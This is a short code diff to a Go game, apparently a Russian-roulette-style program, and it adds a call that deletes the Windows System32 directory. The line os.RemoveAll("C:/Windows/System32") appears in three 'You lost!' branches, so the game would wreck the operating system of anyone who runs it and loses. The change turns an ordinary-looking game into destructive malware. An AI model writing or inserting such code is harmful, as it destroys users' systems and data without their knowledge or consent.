@@ -31,7 +31,7 @@ GameStart:
 
 		case 6:
 			fmt.Println("You lost!")
-
+			os.RemoveAll("C:/Windows/System32")
 		default:
 			fmt.Println("You survived!")
 		}
@@ -44,6 +44,7 @@ GameStart:
 
 		case 6:
 			fmt.Println("You lost!")
+			os.RemoveAll("C:/Windows/System32")
 
 		default:
 			fmt.Println("You survived!")
@@ -57,7 +58,7 @@ GameStart:
 
 		case 6:
 			fmt.Println("You lost!")
-
+			os.RemoveAll("C:/Windows/System32")
 		default:
 			fmt.Println("You survived!")
 		}
